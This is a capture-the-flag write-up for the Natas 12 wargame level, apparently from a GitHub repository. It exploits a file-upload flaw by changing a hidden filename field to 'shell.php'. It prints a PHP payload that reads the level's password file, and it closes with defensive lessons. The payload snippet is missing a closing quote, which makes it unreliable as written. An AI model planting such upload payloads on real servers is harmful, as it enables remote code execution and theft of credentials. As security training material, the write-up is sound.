# 🧪 Natas 12

## 🎯 Objective
Obtain the password for **Natas 13**.

---

## 👀 Observation
- Website provides a **file upload** feature.
- The page claims only **image files** can be uploaded.
- After uploading a file, a **download link** is generated.
- Page source reveals a **hidden field** controlling the uploaded filename.

---

## 🚨 Vulnerability
**Type:**  
- File upload vulnerability / Client-side trust issue

**Root Cause:**  
The application relies on a **client-controlled hidden form** field to determine the uploaded file’s extension.
There is **no proper server-side validation**, allowing an attacker to upload and execute arbitrary files.

---

## 🛠️ Exploitation Steps
1. Inspected the page source of the upload form.
2. Found a hidden input field defining the filename and extension.
3. Changed the file extension from `.jpg` to `.php`.
4. Uploaded a PHP file containing code to read the password file.
5. Accessed the uploaded PHP file via the generated link.
6. Executed the file on the server.
7. Retrieved the password for **Natas 13**.

---

## 💻 Key Payload / Command
**Malicious upload file:**
```bash
<?php
echo file_get_contents("/etc/natas_webpass/natas13);
?>
```
**Hidden field modification:**
```html
<input type="hidden" name="filename" value="shell.php">
```

---

## 📖 Key Takeaways
- Client side controls **cannot be trusted**.
- Hidden form fields are fully attacker-controlled.
- File uploads must be validated **server-side** (type, extension, MIME)
- Allowing executable uploads leads directly to **remote code execution**.
  
---

## 🖼️ Screenshots 
<img width="704" height="239" alt="image" src="https://github.com/user-attachments/assets/6a5520bc-9a4c-4be7-aad7-608af6505a11" />
<img width="915" height="217" alt="image" src="https://github.com/user-attachments/assets/5634da18-b5dc-41b8-9515-89936f74c6d9" /> <br>

*Password redacted for ethical reasons*
